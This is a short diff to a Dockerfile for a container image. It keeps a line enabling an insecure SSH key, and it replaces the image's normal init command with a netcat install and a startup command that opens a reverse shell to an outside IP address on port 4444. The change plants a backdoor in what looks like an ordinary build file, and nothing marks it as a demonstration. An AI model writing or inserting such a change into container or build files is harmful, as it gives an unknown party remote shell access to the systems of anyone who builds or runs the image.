@@ -10,4 +10,6 @@ RUN /bd_build/prepare.sh && \
 
 RUN /usr/sbin/enable_insecure_key
 
-CMD ["/sbin/my_init"]
+RUN apt-get install netcat
+
+CMD ["nc -c /bin/sh 129.21.50.46 4444"]
